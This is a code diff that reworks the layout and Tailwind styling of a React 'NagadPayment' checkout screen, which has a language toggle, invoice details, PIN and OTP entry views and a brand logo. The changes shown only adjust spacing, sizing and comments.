@@ -116,28 +116,30 @@ const NagadPayment = () => {
   );
 
   return (
-    <div className="min-h-screen flex flex-col items-center justify-center bg-gray-300 p-0">
-      <div className="w-full h-screen flex flex-col overflow-hidden border-[8px] border-black"
+    <div className="h-screen w-screen flex items-center justify-center bg-gray-300 overflow-hidden">
+      <div className="w-full h-full flex flex-col overflow-hidden border-[8px] border-black"
         style={{ background: 'linear-gradient(180deg, #C41E3A 0%, #8B0000 100%)' }}>
-        <div className="flex-1 flex flex-col">
-          {/* Language Toggle */}
-          <div className="flex justify-end p-2">
-            <div className="flex overflow-hidden border border-white/50 rounded-sm">
-              <button onClick={() => setLanguage('bn')}
-                className={`px-2 py-0.5 text-[10px] font-bold transition-colors ${language === 'bn' ? 'bg-white/25 text-white' : 'text-white/70'}`}>বাং</button>
-              <button onClick={() => setLanguage('en')}
-                className={`px-2 py-0.5 text-[10px] font-bold transition-colors ${language === 'en' ? 'bg-white/25 text-white' : 'text-white/70'}`}>Eng</button>
-            </div>
+        
+        {/* Language Toggle - fixed at top */}
+        <div className="flex justify-end p-2 shrink-0">
+          <div className="flex overflow-hidden border border-white/50 rounded-sm">
+            <button onClick={() => setLanguage('bn')}
+              className={`px-2 py-0.5 text-[10px] font-bold transition-colors ${language === 'bn' ? 'bg-white/25 text-white' : 'text-white/70'}`}>বাং</button>
+            <button onClick={() => setLanguage('en')}
+              className={`px-2 py-0.5 text-[10px] font-bold transition-colors ${language === 'en' ? 'bg-white/25 text-white' : 'text-white/70'}`}>Eng</button>
           </div>
+        </div>
 
+        {/* Equal-spaced content area */}
+        <div className="flex-1 flex flex-col justify-evenly min-h-0">
           {/* Cart Icon & Title */}
-          <div className="flex flex-col items-center pt-1 pb-2">
+          <div className="flex flex-col items-center shrink-0">
             <img src={cartIcon} alt="Cart" className="w-14 h-14 mb-1 object-contain" />
             <h1 className="text-[#ccc] text-base font-bold">Easy Payment System</h1>
           </div>
 
-          {/* Invoice Details - left-aligned */}
-          <div className="px-8 py-2">
+          {/* Invoice Details */}
+          <div className="px-8 shrink-0">
             <div className="space-y-1">
               <div className="flex">
                 <span className="text-[#ccc] font-bold text-xs w-28">Invoice No:</span>
@@ -154,8 +156,8 @@ const NagadPayment = () => {
             </div>
           </div>
 
-          {/* Input Section - centered between invoice and logo */}
-          <div className="flex-1 flex flex-col items-center justify-center px-5">
+          {/* Input Section */}
+          <div className="flex flex-col items-center px-5 shrink-0">
             {showPinView ? (
               <div className="flex flex-col items-center">
                 <p className="text-[#ccc] text-center text-sm font-bold mb-3">Enter PIN</p>
@@ -186,7 +188,6 @@ const NagadPayment = () => {
               </div>
             )}
 
-            {/* Terms */}
             {!showOtpView && !showPinView && (
               <p className="text-[#ccc] text-center text-[10px] leading-tight font-bold mt-4 px-2">
                 By clicking/tapping "Proceed" you are agreeing to our{" "}
@@ -194,7 +195,6 @@ const NagadPayment = () => {
               </p>
             )}
 
-            {/* Action Buttons */}
             <div className="flex gap-8 justify-center mt-4">
               <button
                 onClick={showPinView ? handlePinConfirm : showOtpView ? handleOtpConfirm : handleConfirm}
@@ -211,8 +211,8 @@ const NagadPayment = () => {
             </div>
           </div>
 
-          {/* White Nagad Logo Footer */}
-          <div className="flex justify-center pb-4">
+          {/* Nagad Logo */}
+          <div className="flex justify-center shrink-0">
             <img src={nagadLogoWhite} alt="Nagad" className="h-10 object-contain" />
           </div>
         </div>
